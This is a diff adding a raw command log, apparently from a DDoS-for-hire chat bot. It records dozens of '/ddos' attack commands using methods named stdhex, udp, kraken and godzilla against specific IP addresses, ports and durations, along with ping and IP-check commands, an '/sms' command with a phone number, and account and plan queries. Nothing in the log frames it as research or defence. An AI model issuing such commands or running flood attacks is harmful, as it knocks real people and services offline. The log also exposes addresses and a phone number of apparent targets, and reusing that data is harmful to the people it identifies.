@@ -1,0 +1,48 @@
+/methods
+/accounts
+/xboxcode
+/ping 151.231.247.47
+/methods
+/sms
+/sms 07495746375
+/ddos stdhex 151.231.247.47 60
+/DDOS stdhex 52.143.251.107:38400 120 80
+/ping 52.143.251.107:38400
+/ping 52.143.251.107:38400
+/DDOS stdhex 52.143.251.107 120 80
+/ping 52.143.251.107
+/plan
+/methods
+/tr4p
+/dbshow PAGE
+/ddos udp 51.171.160.248 20 55092
+/ddos kraken vse 51.171.160.248 20 55092
+/ping 51.171.160.248
+/ddos kraken vse 51.171.160.248 80 60
+/ddos kraken vse 176.249.115.194 80 30
+/ddos kraken vse 176.249.115.194 80 60
+/ddos kraken vse 40.81.35.143 80 120
+/ddos kraken squid 51.37.203.63 80 30
+/ddos kraken squid 51.37.203.63 30 80
+/ddos kraken squid 81.158.125.75 10 80
+/ddos kraken squid 176.249.115.194:3074 30 80
+/ddos kraken squid 176.249.115.194 30 80
+/ddos kraken squid 51.171.160.248 60 80
+/checkip 51.171.160.248
+/ddos godzilla vse 51.171.160.248 30 80
+/ddos godzilla vse 51.171.160.248 30 80
+/ddos godzilla vse 81.158.125.75 30 80
+/ddos godzilla vse 184.90.162.50 60 80
+/ddos godzilla vse 81.158.125.75 30 80
+/ddos godzilla vse 81.158.125.75 30 80
+/ddos godzilla vse 51.171.160.248 80 30
+/ddos kraken vse 82.22.153.215 1200 80
+/godzilla vse 68.132.85.101 1200 80
+/ddos godzilla vse 68.132.85.101 1200 80
+/ddos godzilla vse 68.132.85.101 120 80
+/ddos kraken vse 51.171.160.248 30 80
+/ddos godzilla vse 88.105.15.82 1200 80
+/ddos godzilla vse 88.105.15.82 120 80
+/plan
+[Wed Jul 29 2020 08:58:16 GMT-1100 (Samoa Standard Time)] /plan
+[Fri Jul 31 2020 12:09:29 GMT-1100 (Samoa Standard Time)] /plan
